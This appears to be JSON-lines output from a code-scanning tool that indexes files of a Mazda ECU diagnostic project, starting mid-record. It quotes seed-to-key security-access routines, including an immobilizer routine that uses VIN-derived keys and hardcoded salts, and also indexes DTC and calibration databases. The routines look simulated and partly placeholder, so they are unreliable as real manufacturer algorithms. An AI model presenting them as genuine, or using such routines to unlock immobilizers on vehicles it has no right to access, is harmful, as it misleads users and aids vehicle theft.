self._initialize_algorithms()"}, {"type": "security_pattern", "line": 41, "pattern": "key", "content": "self.vehicle_key_cache = {}"}, {"type": "security_pattern", "line": 43, "pattern": "algorithm", "content": "def _initialize_algorithms(self) -> Dict[MazdaSecurityAlgorithm, callable]:"}, {"type": "security_pattern", "line": 44, "pattern": "algorithm", "content": "\"\"\"Initialize all security algorithms\"\"\""}, {"type": "security_pattern", "line": 46, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_27_STANDARD: self._algorithm_27_standard,"}, {"type": "security_pattern", "line": 47, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_27_ENHANCED: self._algorithm_27_enhanced,"}, {"type": "security_pattern", "line": 48, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_TCM: self._algorithm_tcm,"}, {"type": "security_pattern", "line": 49, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_IMMOBILIZER: self._algorithm_immobilizer,"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_BCM: self._algorithm_bcm,"}, {"type": "security_pattern", "line": 51, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_MANUFACTURER: self._algorithm_manufacturer,"}, {"type": "security_pattern", "line": 52, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_CALIBRATION: self._algorithm_calibration"}, {"type": "security_pattern", "line": 55, "pattern": "key", "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "security_pattern", "line": 55, "pattern": "seed", "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "security_pattern", "line": 55, "pattern": "algorithm", "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "security_pattern", "line": 58, "pattern": "key", "content": "Calculate security key from seed using specified algorithm"}, {"type": "security_pattern", "line": 58, "pattern": "seed", "content": "Calculate security key from seed using specified algorithm"}, {"type": "security_pattern", "line": 58, "pattern": "algorithm", "content": "Calculate security key from seed using specified algorithm"}, {"type": "security_pattern", "line": 61, "pattern": "seed", "content": "seed: Seed bytes from ECU"}, {"type": "security_pattern", "line": 62, "pattern": "algorithm", "content": "algorithm: Security algorithm to use"}, {"type": "security_pattern", "line": 63, "pattern": "algorithm", "content": "vin: Vehicle VIN for VIN-based algorithms"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "additional_data: Additional data required by some algorithms"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "Calculated key bytes or None if failed"}, {"type": "security_pattern", "line": 70, "pattern": "algorithm", "content": "if algorithm not in self.algorithm_database:"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "logger.error(f\"Unknown security algorithm: {algorithm}\")"}, {"type": "security_pattern", "line": 75, "pattern": "key", "content": "key = self.algorithm_database[algorithm](seed, vin, additional_data)"}, {"type": "security_pattern", "line": 75, "pattern": "seed", "content": "key = self.algorithm_database[algorithm](seed, vin, additional_data)"}, {"type": "security_pattern", "line": 75, "pattern": "algorithm", "content": "key = self.algorithm_database[algorithm](seed, vin, additional_data)"}, {"type": "security_pattern", "line": 77, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 78, "pattern": "key", "content": "logger.debug(f\"Calculated key for algorithm {algorithm.name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "logger.debug(f\"Calculated key for algorithm {algorithm.name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "logger.error(f\"Failed to calculate key for algorithm {algorithm.name}\")"}, {"type": "security_pattern", "line": 80, "pattern": "algorithm", "content": "logger.error(f\"Failed to calculate key for algorithm {algorithm.name}\")"}, {"type": "security_pattern", "line": 82, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 85, "pattern": "key", "content": "logger.error(f\"Error calculating seed key: {e}\")"}, {"type": "security_pattern", "line": 85, "pattern": "seed", "content": "logger.error(f\"Error calculating seed key: {e}\")"}, {"type": "security_pattern", "line": 88, "pattern": "seed", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 88, "pattern": "algorithm", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 91, "pattern": "algorithm", "content": "Standard 0x27 Security Algorithm"}, {"type": "security_pattern", "line": 94, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 95, "pattern": "seed", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 95, "pattern": "algorithm", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 97, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 102, "pattern": "seed", "content": "temp = seed[i] ^ 0x73"}, {"type": "security_pattern", "line": 108, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 110, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 112, "pattern": "seed", "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 112, "pattern": "algorithm", "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 115, "pattern": "algorithm", "content": "Enhanced 0x27 Security Algorithm"}, {"type": "security_pattern", "line": 118, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 119, "pattern": "seed", "content": "raise ValueError(\"Enhanced algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 119, "pattern": "algorithm", "content": "raise ValueError(\"Enhanced algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 121, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 126, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 140, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 142, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 144, "pattern": "seed", "content": "def _algorithm_tcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 144, "pattern": "algorithm", "content": "def _algorithm_tcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 147, "pattern": "algorithm", "content": "TCM Security Algorithm"}, {"type": "security_pattern", "line": 150, "pattern": "seed", "content": "if len(seed) != 2:"}, {"type": "security_pattern", "line": 151, "pattern": "seed", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "security_pattern", "line": 151, "pattern": "algorithm", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "security_pattern", "line": 153, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 156, "pattern": "key", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 156, "pattern": "seed", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 157, "pattern": "key", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 157, "pattern": "seed", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 158, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 159, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 161, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 163, "pattern": "seed", "content": "def _algorithm_immobilizer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 163, "pattern": "algorithm", "content": "def _algorithm_immobilizer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 166, "pattern": "algorithm", "content": "Immobilizer Security Algorithm"}, {"type": "security_pattern", "line": 167, "pattern": "key", "content": "Uses VIN-based key derivation and DES encryption"}, {"type": "security_pattern", "line": 167, "pattern": "encrypt", "content": "Uses VIN-based key derivation and DES encryption"}, {"type": "security_pattern", "line": 169, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 170, "pattern": "seed", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 170, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "security_pattern", "line": 176, "pattern": "key", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "security_pattern", "line": 179, "pattern": "key", "content": "des_key = vehicle_key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 180, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 180, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 180, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 181, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 181, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 183, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 183, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 183, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 184, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "security_pattern", "line": 188, "pattern": "key", "content": "Derive immobilizer key from VIN"}, {"type": "security_pattern", "line": 194, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 194, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 195, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 195, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 196, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 196, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 198, "pattern": "key", "content": "return key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 200, "pattern": "seed", "content": "def _algorithm_bcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 200, "pattern": "algorithm", "content": "def _algorithm_bcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 203, "pattern": "algorithm", "content": "BCM Security Algorithm"}, {"type": "security_pattern", "line": 206, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 207, "pattern": "seed", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 207, "pattern": "algorithm", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 209, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 213, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 222, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 224, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 226, "pattern": "seed", "content": "def _algorithm_manufacturer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 226, "pattern": "algorithm", "content": "def _algorithm_manufacturer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 229, "pattern": "algorithm", "content": "Manufacturer Security Algorithm"}, {"type": "security_pattern", "line": 232, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 233, "pattern": "seed", "content": "raise ValueError(\"Manufacturer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 233, "pattern": "algorithm", "content": "raise ValueError(\"Manufacturer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 236, "pattern": "key", "content": "manufacturer_key = self._get_manufacturer_key()"}, {"type": "security_pattern", "line": 238, "pattern": "key", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 238, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 238, "pattern": "cipher", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 239, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 239, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 241, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 241, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 241, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 242, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 244, "pattern": "key", "content": "def _get_manufacturer_key(self) -> bytes:"}, {"type": "security_pattern", "line": 246, "pattern": "key", "content": "Get manufacturer master key"}, {"type": "security_pattern", "line": 251, "pattern": "key", "content": "base_key = b'mazda_manufacturer_key_2024'"}, {"type": "security_pattern", "line": 252, "pattern": "key", "content": "return hashlib.sha256(base_key).digest()[:16]  # 16 bytes for AES-128"}, {"type": "security_pattern", "line": 252, "pattern": "hash", "content": "return hashlib.sha256(base_key).digest()[:16]  # 16 bytes for AES-128"}, {"type": "security_pattern", "line": 254, "pattern": "seed", "content": "def _algorithm_calibration(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 254, "pattern": "algorithm", "content": "def _algorithm_calibration(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 257, "pattern": "algorithm", "content": "Calibration Security Algorithm"}, {"type": "security_pattern", "line": 260, "pattern": "seed", "content": "if len(seed) != 6:"}, {"type": "security_pattern", "line": 261, "pattern": "seed", "content": "raise ValueError(\"Calibration algorithm requires 6-byte seed\")"}, {"type": "security_pattern", "line": 261, "pattern": "algorithm", "content": "raise ValueError(\"Calibration algorithm requires 6-byte seed\")"}, {"type": "security_pattern", "line": 264, "pattern": "algorithm", "content": "raise ValueError(\"Calibration algorithm requires additional data\")"}, {"type": "security_pattern", "line": 266, "pattern": "key", "content": "key = bytearray(6)"}, {"type": "security_pattern", "line": 270, "pattern": "seed", "content": "seed_byte = seed[i]"}, {"type": "security_pattern", "line": 274, "pattern": "seed", "content": "temp = (seed_byte + data_byte) & 0xFF"}, {"type": "security_pattern", "line": 280, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 282, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 284, "pattern": "seed", "content": "def request_seed(self, ecu_address: int, security_level: int) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 286, "pattern": "seed", "content": "Request seed from ECU for security access"}, {"type": "security_pattern", "line": 289, "pattern": "seed", "content": "ecu_address: ECU address to request seed from"}, {"type": "security_pattern", "line": 293, "pattern": "seed", "content": "Seed bytes or None if failed"}, {"type": "security_pattern", "line": 299, "pattern": "seed", "content": "seed_length = self._get_seed_length_for_level(security_level)"}, {"type": "security_pattern", "line": 300, "pattern": "seed", "content": "seed = bytes([random.randint(0, 255) for _ in range(seed_length)])"}, {"type": "security_pattern", "line": 302, "pattern": "seed", "content": "logger.debug(f\"Generated seed for level {security_level}: {seed.hex().upper()}\")"}, {"type": "security_pattern", "line": 303, "pattern": "seed", "content": "return seed"}, {"type": "security_pattern", "line": 306, "pattern": "seed", "content": "logger.error(f\"Error requesting seed: {e}\")"}, {"type": "security_pattern", "line": 309, "pattern": "seed", "content": "def _get_seed_length_for_level(self, security_level: int) -> int:"}, {"type": "security_pattern", "line": 310, "pattern": "seed", "content": "\"\"\"Get required seed length for security level\"\"\""}, {"type": "security_pattern", "line": 311, "pattern": "seed", "content": "seed_lengths = {"}, {"type": "security_pattern", "line": 320, "pattern": "seed", "content": "return seed_lengths.get(security_level, 4)"}, {"type": "security_pattern", "line": 322, "pattern": "key", "content": "def send_key(self, ecu_address: int, security_level: int, key: bytes) -> bool:"}, {"type": "security_pattern", "line": 324, "pattern": "key", "content": "Send calculated key to ECU for security access"}, {"type": "security_pattern", "line": 327, "pattern": "key", "content": "ecu_address: ECU address to send key to"}, {"type": "security_pattern", "line": 329, "pattern": "key", "content": "key: Calculated key bytes"}, {"type": "security_pattern", "line": 337, "pattern": "key", "content": "logger.debug(f\"Sending key for level {security_level}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 343, "pattern": "key", "content": "logger.error(f\"Error sending key: {e}\")"}, {"type": "security_pattern", "line": 346, "pattern": "security_access", "content": "def perform_security_access(self, ecu_address: int, security_level: int,"}, {"type": "security_pattern", "line": 347, "pattern": "algorithm", "content": "algorithm: MazdaSecurityAlgorithm,"}, {"type": "security_pattern", "line": 356, "pattern": "algorithm", "content": "algorithm: Security algorithm to use"}, {"type": "security_pattern", "line": 367, "pattern": "seed", "content": "seed = self.request_seed(ecu_address, security_level)"}, {"type": "security_pattern", "line": 368, "pattern": "seed", "content": "if not seed:"}, {"type": "security_pattern", "line": 369, "pattern": "seed", "content": "logger.error(\"Failed to request seed from ECU\")"}, {"type": "security_pattern", "line": 373, "pattern": "key", "content": "key = self.calculate_seed_key(seed, algorithm, vin, additional_data)"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "key = self.calculate_seed_key(seed, algorithm, vin, additional_data)"}, {"type": "security_pattern", "line": 373, "pattern": "algorithm", "content": "key = self.calculate_seed_key(seed, algorithm, vin, additional_data)"}, {"type": "security_pattern", "line": 374, "pattern": "key", "content": "if not key:"}, {"type": "security_pattern", "line": 375, "pattern": "key", "content": "logger.error(\"Failed to calculate security key\")"}, {"type": "security_pattern", "line": 379, "pattern": "key", "content": "access_granted = self.send_key(ecu_address, security_level, key)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds3.py", "lines_read": 605, "features_found": [{"type": "function", "name": "__init__", "line": 50}, {"type": "function", "name": "_initialize_dtc_database", "line": 53}, {"type": "function", "name": "get_dtc_definition", "line": 564}, {"type": "function", "name": "get_dtcs_by_system", "line": 568}, {"type": "function", "name": "get_dtcs_by_severity", "line": 572}, {"type": "function", "name": "get_mazda_specific_dtcs", "line": 576}, {"type": "function", "name": "search_dtcs", "line": 580}, {"type": "function", "name": "get_diagnostic_procedure", "line": 593}, {"type": "function", "name": "get_repair_procedure", "line": 600}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}], "components_found": [{"type": "class", "name": "DTCSeverity", "line": 15}, {"type": "class", "name": "DTCStatus", "line": 21}, {"type": "class", "name": "DTCDefinition", "line": 28}, {"type": "class", "name": "MazdaDTCDatabase", "line": 44}], "algorithms": [], "protocols": [{"type": "protocol", "line": 529, "protocol": "CAN", "content": "\"CAN bus communication failure\","}, {"type": "protocol", "line": 536, "protocol": "CAN", "content": "\"Check CAN bus communication with scan tool\","}, {"type": "protocol", "line": 543, "protocol": "CAN", "content": "\"Repair CAN bus wiring if damaged\","}, {"type": "protocol", "line": 549, "protocol": "CAN", "content": "\"CAN bus communication status\","}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 133, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 175, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 261, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 343, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 347, "hardware": "vehicle", "content": "manufacturer_notes=\"Common on modified vehicles with aftermarket tuning\""}, {"type": "hardware", "line": 387, "hardware": "ECU", "content": "\"Fault present for 2 consecutive trips\""}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "\"No misfires detected for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 429, "hardware": "ECU", "content": "\"Fault present for 2 consecutive trips\""}, {"type": "hardware", "line": 432, "hardware": "ECU", "content": "\"No misfires detected in cylinder 1 for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 515, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 529, "hardware": "CAN bus", "content": "\"CAN bus communication failure\","}, {"type": "hardware", "line": 536, "hardware": "CAN bus", "content": "\"Check CAN bus communication with scan tool\","}, {"type": "hardware", "line": 543, "hardware": "CAN bus", "content": "\"Repair CAN bus wiring if damaged\","}, {"type": "hardware", "line": 549, "hardware": "CAN bus", "content": "\"CAN bus communication status\","}, {"type": "hardware", "line": 558, "hardware": "ECU", "content": "\"Communication restored with PCM for 3 consecutive drive cycles\","}], "security_logic": [{"type": "security_pattern", "line": 280, "pattern": "key", "content": "\"Test MAF sensor output voltage with key ON, engine OFF\","}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds4.py", "lines_read": 394, "features_found": [{"type": "function", "name": "__init__", "line": 62}, {"type": "function", "name": "_initialize_calibration_database", "line": 66}, {"type": "function", "name": "_get_maps_l3k9_18_881a", "line": 91}, {"type": "function", "name": "_get_parameters_l3k9_18_881a", "line": 207}, {"type": "function", "name": "_get_safety_limits_l3k9_18_881a", "line": 224}, {"type": "function", "name": "_get_maps_l3k9_18_881b", "line": 239}, {"type": "function", "name": "_get_parameters_l3k9_18_881b", "line": 255}, {"type": "function", "name": "_get_safety_limits_l3k9_18_881b", "line": 265}, {"type": "function", "name": "_initialize_ecu_database", "line": 274}, {"type": "function", "name": "get_calibration", "line": 301}, {"type": "function", "name": "get_calibration_map", "line": 305}, {"type": "function", "name": "get_ecu_info", "line": 312}, {"type": "function", "name": "list_all_calibrations", "line": 316}, {"type": "function", "name": "search_calibrations_by_vehicle", "line": 320}, {"type": "function", "name": "compare_calibrations", "line": 330}, {"type": "function", "name": "generate_calibration_report", "line": 364}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}], "components_found": [{"type": "class", "name": "CalibrationType", "line": 17}, {"type": "class", "name": "CalibrationMap", "line": 28}, {"type": "class", "name": "ECUCalibration", "line": 45}, {"type": "class", "name": "MazdaCalibrationDatabase", "line": 56}], "algorithms": [], "protocols": [{"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFA000,"}, {"type": "protocol", "line": 130, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFA800,"}, {"type": "protocol", "line": 163, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFB000,"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0xFFB400,"}, {"type": "protocol", "line": 284, "protocol": "CAN", "content": "\"supported_protocols\": [\"CAN_11BIT\", \"KWP2000\"],"}, {"type": "protocol", "line": 284, "protocol": "KWP", "content": "\"supported_protocols\": [\"CAN_11BIT\", \"KWP2000\"],"}, {"type": "protocol", "line": 295, "protocol": "CAN", "content": "\"supported_protocols\": [\"CAN_11BIT\", \"KWP2000\"],"}, {"type": "protocol", "line": 295, "protocol": "KWP", "content": "\"supported_protocols\": [\"CAN_11BIT\", \"KWP2000\"],"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "MAZDA CALIBRATION DATABASE - Complete ECU Calibration Data"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "class ECUCalibration:"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "\"\"\"Complete ECU calibration definition\"\"\""}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "ecu_type: str"}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "Contains all ECU calibration data for 2011 Mazdaspeed 3"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "self.ecu_database = self._initialize_ecu_database()"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "def _initialize_calibration_database(self) -> Dict[str, ECUCalibration]:"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "\"L3K9-18-881A\": ECUCalibration("}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "ecu_type=\"MZR 2.3L DISI TURBO - 2011 MAZDASPEED 3\","}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "\"L3K9-18-881B\": ECUCalibration("}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "ecu_type=\"MZR 2.3L DISI TURBO - 2011 MAZDASPEED 3 (Updated)\","}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "\"\"\"Get calibration maps for L3K9-18-881A ECU\"\"\""}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "def _initialize_ecu_database(self) -> Dict[str, Dict[str, Any]]:"}, {"type": "hardware", "line": 275, "hardware": "ECU", "content": "\"\"\"Initialize ECU hardware database\"\"\""}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "\"ecu_type\": \"MZR DISI TURBO\","}, {"type": "hardware", "line": 279, "hardware": "vehicle", "content": "\"vehicle_model\": \"MAZDASPEED 3 2011\","}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "\"ecu_type\": \"MZR DISI TURBO\","}, {"type": "hardware", "line": 290, "hardware": "vehicle", "content": "\"vehicle_model\": \"MAZDASPEED 3 2011\","}, {"type": "hardware", "line": 301, "hardware": "ECU", "content": "def get_calibration(self, calibration_id: str) -> Optional[ECUCalibration]:"}, {"type": "hardware", "line": 312, "hardware": "ECU", "content": "def get_ecu_info(self, hardware_number: str) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 313, "hardware": "ECU", "content": "\"\"\"Get ECU hardware information\"\"\""}, {"type": "hardware", "line": 314, "hardware": "ECU", "content": "return self.ecu_database.get(hardware_number)"}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "def search_calibrations_by_vehicle(self, vehicle_model: str) -> List[ECUCalibration]:"}, {"type": "hardware", "line": 320, "hardware": "vehicle", "content": "def search_calibrations_by_vehicle(self, vehicle_model: str) -> List[ECUCalibration]:"}, {"type": "hardware", "line": 321, "hardware": "vehicle", "content": "\"\"\"Search calibrations by vehicle model\"\"\""}, {"type": "hardware", "line": 323, "hardware": "ECU", "content": "for cal_id, ecu_info in self.ecu_database.items():"}, {"type": "hardware", "line": 324, "hardware": "ECU", "content": "if vehicle_model.lower() in ecu_info[\"vehicle_model\"].lower():"}, {"type": "hardware", "line": 324, "hardware": "vehicle", "content": "if vehicle_model.lower() in ecu_info[\"vehicle_model\"].lower():"}, {"type": "hardware", "line": 372, "hardware": "ECU", "content": "\"ecu_type\": calibration.ecu_type,"}], "security_logic": [{"type": "security_pattern", "line": 318, "pattern": "key", "content": "return list(self.calibration_database.keys())"}, {"type": "security_pattern", "line": 379, "pattern": "key", "content": "\"key_parameters\": calibration.parameters,"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
